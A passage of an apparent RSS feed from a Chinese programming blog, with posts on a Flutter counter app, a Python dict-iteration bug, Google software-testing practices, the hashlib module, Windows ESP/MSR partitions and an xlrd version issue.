  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  _MyHomePageState &lt;span style=&#34;color:#a6e22e&#34;&gt;createState&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; _MyHomePageState&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_MyHomePageState&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; State&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;MyHomePage&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;MyHomePage 是 Flutter 应用的首页，它继承自 StatefulWidget 类，表示它是一个有状态的组件。&lt;/li&gt;
&lt;li&gt;_MyHomePageState 类是 MyHomePage 类对应的状态类。和 MyApp 类不同， MyHomePage 类中并没有 build 方法，取而代之的是，build 方法被挪到了 MyHomePage 类对应的状态类中。这样做是使得类的构建和 UI 界面的构建进行分离&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3界面构建&#34;&gt;3）界面构建&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt; Widget &lt;span style=&#34;color:#a6e22e&#34;&gt;build&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BuildContext context&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Scaffold&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
      appBar&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; AppBar&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        title&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Text&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;widget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      body&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Center&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Column&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
          mainAxisAlignment&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; MainAxisAlignment&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;center&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
          children&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Widget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;[&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
              &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You have pushed the button this many times:&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Text&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
              &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;$_counter&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
              style&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Theme&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;of&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;textTheme&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;headline4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
          &lt;span style=&#34;color:#f92672&#34;&gt;],&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      floatingActionButton&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FloatingActionButton&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        onPressed&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; _incrementCounter&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
        tooltip&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Increment&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
        child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Icon&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Icons&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Scaffold 是 Material 库中提供的页面脚手架，它提供了默认的导航栏、标题和包含主屏幕 widget 树的 body 属性。&lt;/li&gt;
&lt;li&gt;body 的组件树中包含了一个 Center 组件，Center 可以将其子组件树对齐到屏幕中心。此例中， Center 子组件是一个 Column 组件，Column 的作用是将其所有子组件沿屏幕垂直方向依次排列； 此例中 Column 子组件是两个 Text，第一个Text 显示固定文本 You have pushed the button this many times，第二个 Text 显示 _counter 状态的数值。&lt;/li&gt;
&lt;li&gt;floatingActionButton 是出现在页面右下角的带 + 的悬浮按钮，它的 onPressed 属性接受一个回调函数，代表它被点击后的处理器，本例中将 _incrementCounter 方法作为其处理函数。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>BUG—字典在遍历时不能进行修改</title>
        <link>https://ac-lm.github.io/posts/bug/bug%E5%AD%97%E5%85%B8%E5%9C%A8%E9%81%8D%E5%8E%86%E6%97%B6%E4%B8%8D%E8%83%BD%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9/</link>
        <pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bug%E5%AD%97%E5%85%B8%E5%9C%A8%E9%81%8D%E5%8E%86%E6%97%B6%E4%B8%8D%E8%83%BD%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;}
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys():
	&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; a[key]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行上述代码时会出现报错&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;字典在遍历时不能被修改，需要将字典转成列表或集合再进行遍历。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;}
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; list(a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys()):
	&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; a[key]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Google软件测试之道(2)</title>
        <link>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%932/</link>
        <pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%932/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;http://www.51testing.com/html/12/n-853012.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Google软件测试之道  @Whittaker Arb &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;版本划分&#34;&gt;版本划分&lt;/h2&gt;
&lt;p&gt;Google经常在最初的版本里只包含最基本的可用功能，然后在后继的快速迭代的过程中得到内部和外部用户的反馈，而且在每次迭代的过程中都非常注重质量。一个产品在发布给用户使用之前，一般都要经历&lt;strong&gt;金丝雀版本、开发版本、测试版本、beta或正式发布版本&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;Google发布的过程虽然快，但也并不像想象中如牛仔一般的鲁莽与仓促。实际上，为了发布我们称之为beta的版本，一个产品要经历一系列的内部版本验证，用以证明它已经具备了一定的质量。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;金丝雀版本&lt;/strong&gt;：这是每日都要构建的版本，用来排除过滤一些明显不适宜的版本。就像煤矿井里的金丝雀（译注：17世纪，英国人将金丝雀放到煤矿井里检测井中空气质量。如果金丝雀死了，则表示矿井中的空气已达到令人中毒的水平。此处意为对一件事情的预警），如果构建失败了的话，意味着我们的流程可能在哪里出了问题，需要去复查一遍我们的工作。使用金丝雀版本需要极强的容忍度，而且在这个版本下可能无法使用应有的基本功能。一般来说，只有这个产品的工程师（开发或测试人员）和管理人员才会安装使用金丝雀版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;开发版本&lt;/strong&gt;：这是开发人员日常使用的版本，一般是每周发布一个。该版本具有一定的功能并通过了一系列的测试（我们将会在随后的章节里讨论这点）。所有这个产品下的工程师都会被要求去安装这个版本，并在日常工作中真正使用它，这样可以持续对这个版本进行测试。如果一个开发版本不能够满足日常真实工作的需求，那么它将会被打回为金丝雀版本。发生这种情况不但令人郁闷，工程团队也需要再花费大量的时间去重新评估。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;测试版本&lt;/strong&gt;：这是一个通过了持续测试的版本。这个版本基本上是最近一个月里的最佳版本了，也是工程师在日常工作中使用的最稳定最信任的一个版本。测试版本可以被挑选作为内部尝鲜（译注：dog food）版本，如果该版本有比较持续的优良表现，也是作为beta测试的候选版本。一些情况下，如果测试版本在公司内部使用得足够稳定，一些想更早尝试这个产品的外部合作伙伴也会使用这个版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;beta或发布版本&lt;/strong&gt;：这个版本是由非常稳定的测试版本演变而来，并经历了内部使用和通过所有质量考核的一个版本，也是对外发布的第一个版本。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试类型&#34;&gt;测试类型&lt;/h2&gt;
&lt;p&gt;Google并没有使用代码测试、集成测试、系统测试等这些命名方式，而是使用小型测试、中型测试、大型测试这样的称谓（不要和敏捷社区发的那些T恤型号混为一谈），着重强调测试的范畴规模而非形式。小型测试意味着涵盖较少量的代码，其他的测试类型以此类推。Google的三类工程师都会去执行其中的任何一种测试，无论是自动化的还是手动的。测试的规模越小，就越有可能被实现成为自动化的测试。&lt;/p&gt;
&lt;h3 id=&#34;小型测试&#34;&gt;小型测试&lt;/h3&gt;
&lt;p&gt;一般来说（但也并非所有）都是自动化实现的，用于验证一个单独函数或独立功能模块的代码是否按照预期工作，着重于典型功能性问题、数据损坏、错误条件和大小差一错误等方面的验证。小型测试的运行时间一般比较短，通常是在几秒或更短的时间内就可以运行完毕。通常，小型测试是由SWE来实现，也会有少量的SET参与，TE几乎不参与小型测试。小型测试一般需要使用mock和fake（译注：mock fake环境是实际依赖系统的替代者，会提供相应的功能，但这些系统可能不存在，或者缺陷太多不可靠，或者是一些很难模拟的错误条件）才能运行。TE几乎不编写小型测试代码，但会参与运行这些测试，来诊断一些特定错误。小型测试主要尝试解决的问题是&amp;quot;这些代码是否按照预期的方式运行&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;中型测试&#34;&gt;中型测试&lt;/h3&gt;
&lt;p&gt;通常也都是自动化实现的。该测试一般会涉及两个或两个以上，甚至更多模块之间的交互。测试重点在于验证这些&amp;quot;功能近邻区&amp;quot;之间的交互，以及彼此调用时的功能是否正确（我们称功能交互区域为&amp;quot;功能近邻区&amp;quot;）。在产品早期开发过程中，在独立模块功能被开发完毕之后，SET会驱动这些测试的实现及运行，SWE会深度参与，一起编码、调试和维护这些测试。如果一个中型测试运行失败，SWE会自觉地去查看分析原因。在开发过程的后期，TE会通过手动的方式（如果比较难去实现自动化或实现的代价较大时），或者自动化地执行这些用例。中型测试尝试去解决的问题是，一系列临近的模块互相交互的时候，是否如我们预期的那样工作。&lt;/p&gt;
&lt;h3 id=&#34;大型测试&#34;&gt;大型测试&lt;/h3&gt;
&lt;p&gt;涵盖三个或以上（通常更多）的功能模块，使用真实用户使用场景和实际用户数据，一般可能需要消耗数个小时或更长的时间才能运行完成。大型测试关注的是所有模块的集成，但更倾向于结果驱动，验证软件是否满足最终用户的需求。所有的三种工程师角色都会参与到大型测试之中，或是通过自动化测试，或是探索式测试。大型测试尝试去解决的问题是，这个产品操作运行方式是否和用户的期望相同，并产生预期的结果。这种端到端的使用场景以及在整体产品或服务之上的操作行为，即是大型测试关注的重点。&lt;/p&gt;
&lt;p&gt;小型测试涵盖单一的代码段，一般运行在完全虚假实现（fake）的环境里。中型测试涵盖多个模块且重点关注在模块之间的交互上，一般运行在虚假实现（fake）环境或真实环境中。大型测试涵盖任意多个模块，一般运行在真实的环境中，并使用真正的用户数据与资源。&lt;/p&gt;
&lt;h2 id=&#34;自动化测试和手动测试&#34;&gt;自动化测试和手动测试&lt;/h2&gt;
&lt;p&gt;最后，关于自动化测试和手动测试的比例，对于所有的三种类型测试，当然更倾向于前者。如果能够自动化，并不需要人脑的智睿与直觉来判断，那就应该以自动化的方式实现。但在一些情况下需要人类智慧的判断，如用户界面是否漂亮、保留的数据是否包含隐私等方面，这些还是需要手动测试来完成。&lt;/p&gt;
&lt;p&gt;正如上文中提到的，同时也是值得重点关注的一点，Google也有大量的手动测试，有些使用脚本的方式在记录（译注：scripted ，脚本的方式，通过把每一个步骤都记录下来的方式表示用例的内容），而另外一些使用探索式的方法，这些测试都在被密切地关注，以后可能被自动化方式所替代。通过使用定位点击的验证方式、录制技术等可以把一些手动测试转变成自动化测试，这些自动化测试在每次建立之后都会重复地回归运行，而手动测试更倾向于关注于新功能。我们甚至把开bug和日常的手动工作都自动化实现了，例如，如果自动化用例运行失败，系统会自动检查到最后一次代码变更的内容，这些变更极有可能是造成失败的罪魁祸首。系统会自动给代码变更的提交者发送一封邮件，并新开一个bug来记录这个问题。 将自动化推至&amp;quot;最后一英寸人类的智慧&amp;quot;是Google 正在构建的下一代测试工具的设计目标。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—hashlib 模块</title>
        <link>https://ac-lm.github.io/posts/python/pythonhashlib-%E6%A8%A1%E5%9D%97/</link>
        <pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonhashlib-%E6%A8%A1%E5%9D%97/</guid>
        <description>&lt;h2 id=&#34;1sha256&#34;&gt;1.SHA256&lt;/h2&gt;
&lt;p&gt;SHA256 的全称是Secure Hash Algorithm 256，一种常用的加密算法，是SHA-2族算法中的一个，其它的还是SHA222、SHA512等。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Secure的意思是指算法的输入输出一一对应，且是不可逆的（即只有编码而没有解码）&lt;/li&gt;
&lt;li&gt;Hash Algorithm指的是散列算法，散列算法指的是将一个任意长度的输入数据转换成固定长度的输出&lt;/li&gt;
&lt;li&gt;256是输出结果的位数，这个输出结果又被称为Hash值或者摘要&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2hashlib模块&#34;&gt;2.hashlib模块&lt;/h2&gt;
&lt;p&gt;hashlib是Python提供的能使用各类hash算法的一个模块&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hashlib

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sha256()    &lt;span style=&#34;color:#75715e&#34;&gt;# Get the hash algorithm.&lt;/span&gt;
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;jiangwei&amp;#34;&lt;/span&gt;)    &lt;span style=&#34;color:#75715e&#34;&gt;# Hash the data.&lt;/span&gt;
    b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()       &lt;span style=&#34;color:#75715e&#34;&gt;# Get he hash value.&lt;/span&gt;
    print b
    
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;d6824c3942c1ec34d1b5cc2f5cbe3d2c4110223bce905ddafe0592723411f0
&lt;span style=&#34;color:#75715e&#34;&gt;# 它的长度是64，每个字符4位，所以总计是256位。&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sha512()    &lt;span style=&#34;color:#75715e&#34;&gt;# Get the hash algorithm.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;ee15fe269635e2c05d7e965d97d82b95fefcdf7f937cb14e117d235a440b9e173d90f3c669a5dce21d6b8a20ff2376172d171d0c9d9b1f2670d39aefaab7a10
&lt;span style=&#34;color:#75715e&#34;&gt;# 可以得到512位的摘要&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Windows—系统安装时的 esp 和 msr 分区</title>
        <link>https://ac-lm.github.io/posts/windows10/windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E6%97%B6%E7%9A%84-esp-%E5%92%8C-msr-%E5%88%86%E5%8C%BA/</link>
        <pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/windows10/windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E6%97%B6%E7%9A%84-esp-%E5%92%8C-msr-%E5%88%86%E5%8C%BA/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;硬盘在安装系统前需要进行格式化和分区，而 esp 和 msr 两个分区必须分配在最开始&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1esp-即-efi-系统分区&#34;&gt;1.esp 即 EFI 系统分区&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;esp 全称 EFI system partition，EFI 系统引导。任何支持 EFI 模式的电脑都需要从 ESP 启动系统，EFI 固件可从 ESP 加载 EFI 启动程序和应用程序。&lt;/li&gt;
&lt;li&gt;esp 是一个 FAT16 或 FAT32 格式的物理分区，其分区标识是EF（十六进制）而非常规的 0E 或 0C，因此，该分区在 Windows 操作系统下一般是不可见的。&lt;/li&gt;
&lt;li&gt;esp 是一个独立于操作系统之外的分区，操作系统被引导之后，就不再依赖它。这使得 esp 非常适合用来存储那些系统级的维护性的工具和数据，比如：引导管理程序、驱动程序、系统维护工具、系统备份等，甚至可以在 esp 里安装一个特殊的操作系统。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2msr-是保留分区&#34;&gt;2.msr 是保留分区&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;msr 分区本身没有做任何工作，是名副其实的保留分区。&lt;/li&gt;
&lt;li&gt;Windows 不会向 msr 分区建立文件系统或者写数据，这是为了调整分区结构而保留的分区，msr 分区本质上就是写在分区表上面的未分配空间。&lt;/li&gt;
&lt;li&gt;msr 分区的用途是防止将一块 GPT 磁盘接到老系统中，被当作未格式化的空硬盘而继续操作（例如重新格式化）导致的数据丢失。若 GPT 磁盘上有这个分区，那么当把它接入 XP 等老系统中时，系统便会提示无法识别的磁盘，也无法进一步操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051002838.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051002838.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—xlrd 模块无法打开 .xlsx 文件</title>
        <link>https://ac-lm.github.io/posts/bug/bugxlrd-%E6%A8%A1%E5%9D%97%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80-.xlsx-%E6%96%87%E4%BB%B6/</link>
        <pubDate>Tue, 30 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugxlrd-%E6%A8%A1%E5%9D%97%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80-.xlsx-%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;xlrd 模块更新后，无法打开 .xlsx 文件，报错 &lt;code&gt;xlrd.biffh.XLRDError: Excel xlsx file；not supported&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;xlrd 在更新到了2.0.1版本后只支持 .xls 文件，若要打开 .xlsx 文件需要安装旧版 xlrd，执行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pip uninstall xlrd
pip install xlrd&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.2.0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Google软件测试之道(1)</title>
        <link>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%931/</link>
        <pubDate>Tue, 30 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%931/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;http://www.51testing.com/html/12/n-853012.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Google软件测试之道  @Whittaker Arb &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;质量不等于测试&#34;&gt;质量不等于测试&lt;/h2&gt;
&lt;p&gt;Google是一家以创新和速度为基础的公司，快速地发布代码，迭代地增加功能，这是Google常做的。在这样的环境下，测试不得不变的异常灵活，并且在技能上要做许多前期的规划，仅仅只是简单维护并不能真正解决问题。&lt;strong&gt;有时，测试和开发互相交织在一起，达到了无法区分彼此的程度，而在另外一些时候，测试和开发又是完全分离，甚至开发人员都不知道测试在做些什么。&lt;/strong&gt;&lt;/p&gt;
